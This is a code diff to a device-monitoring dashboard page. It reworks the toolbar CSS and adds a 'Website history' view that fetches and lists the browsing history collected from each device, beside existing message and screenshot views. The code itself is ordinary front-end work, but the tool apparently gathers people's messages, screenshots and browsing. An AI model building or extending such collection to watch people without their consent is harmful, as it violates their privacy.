@@ -459,14 +459,18 @@
       overflow-wrap: anywhere;
     }
     .feed-toolbar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 10px;
       padding: 12px 20px 0;
     }
+    .feed-toolbar > #scopeLabel { order: 1; }
+    .feed-toolbar > .view-switch { order: 2; }
+    .feed-toolbar > .message-search { order: 3; width: 100%; }
     .view-switch {
-      display: inline-flex;
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      width: 100%;
       border: 1px solid var(--border);
       border-radius: 8px;
       overflow: hidden;
@@ -481,6 +485,7 @@
       font: inherit;
       font-size: 0.68rem;
       font-weight: 700;
+      white-space: nowrap;
     }
     .view-switch button:last-child { border-right: 0; }
     .view-switch button.active { color: var(--accent); background: rgba(120, 217, 209, 0.12); }
@@ -559,6 +564,11 @@
       .metric { padding: 0; border-top: 0; }
       .metric-value { font-size: 0.72rem; }
       .status { padding: 12px 16px 0; font-size: 0.72rem; }
+      .feed-toolbar { gap: 8px; padding: 12px 14px 0; }
+      .view-switch { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .view-switch button:nth-child(2) { border-right: 0; }
+      .view-switch button:nth-child(-n + 2) { border-bottom: 1px solid var(--border); }
+      .message-search { min-height: 38px; width: 100%; }
       .feed { padding: 12px 14px 18px; }
       .bubble { max-width: 92%; padding: 11px 12px 9px; }
       .devices-panel {
@@ -570,6 +580,8 @@
       .devices-heading { margin-bottom: 8px; }
       .device-list { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px 14px; }
       .device-row { padding: 8px 0; }
+      .device-name { font-size: 0.74rem; }
+      .device-id, .device-seen, .device-state { font-size: 0.62rem; }
     }
     @media (max-width: 420px) {
       .brand { font-size: 0.64rem; letter-spacing: 0.1em; }
@@ -579,6 +591,7 @@
       .metric-label { font-size: 0.58rem; }
       .metric-value { font-size: 0.66rem; }
       .device-list { grid-template-columns: 1fr; }
+      .view-switch button { padding: 8px 6px; font-size: 0.62rem; }
       .raw-event { grid-template-columns: 1fr; gap: 3px; }
     }
 
@@ -683,6 +696,7 @@
             <button type="button" data-mode="raw">Raw</button>
             <button type="button" data-mode="raw-history">Raw history</button>
             <button type="button" data-mode="screenshots">Screenshots</button>
+            <button type="button" data-mode="website-history">Website history</button>
           </div>
         </div>
         <form class="raw-history-controls" id="rawHistoryControls" hidden>
@@ -1187,6 +1201,38 @@
       }
     }
 
+    async function loadWebsiteHistory() {
+      try {
+        const query = selectedDeviceId ? `?device_id=${encodeURIComponent(selectedDeviceId)}` : '';
+        const entries = await fetchJson(`/api/website-history${query}`);
+        feed.innerHTML = '';
+        if (!entries.length) {
+          feed.innerHTML = '<span class="device-seen">No website history saved</span>';
+        } else {
+          entries.forEach((entry) => {
+            const row = document.createElement('div');
+            row.className = 'raw-event';
+            const time = document.createElement('time');
+            time.textContent = formatTime(entry.visited_at);
+            const browser = document.createElement('strong');
+            browser.textContent = `${entry.browser} · ${entry.device_name}`;
+            const link = document.createElement('a');
+            link.href = entry.url;
+            link.target = '_blank';
+            link.rel = 'noopener noreferrer';
+            link.textContent = entry.url;
+            row.append(time, browser, link);
+            feed.appendChild(row);
+          });
+        }
+        messageCountEl.textContent = entries.length;
+        statusEl.textContent = `Website history: ${entries.length}`;
+      } catch (err) {
+        feed.innerHTML = '<span class="device-seen">Website history unavailable</span>';
+        statusEl.textContent = 'Website history unavailable';
+      }
+    }
+
     function connectEvents() {
       const params = new URLSearchParams();
       if (selectedDeviceId) params.set('device_id', selectedDeviceId);
@@ -1216,6 +1262,9 @@
         } else if (displayMode === 'screenshots') {
           if (eventSource) eventSource.close();
           loadScreenshots();
+        } else if (displayMode === 'website-history') {
+          if (eventSource) eventSource.close();
+          loadWebsiteHistory();
         } else {
           if (!eventSource || eventSource.readyState === EventSource.CLOSED) connectEvents();
           renderFeed();
@@ -1252,6 +1301,7 @@
     setInterval(loadDevices, 3000);
     setInterval(() => {
       if (displayMode === 'screenshots') loadScreenshots();
+      if (displayMode === 'website-history') loadWebsiteHistory();
     }, 3000);
   </script>
 </body>
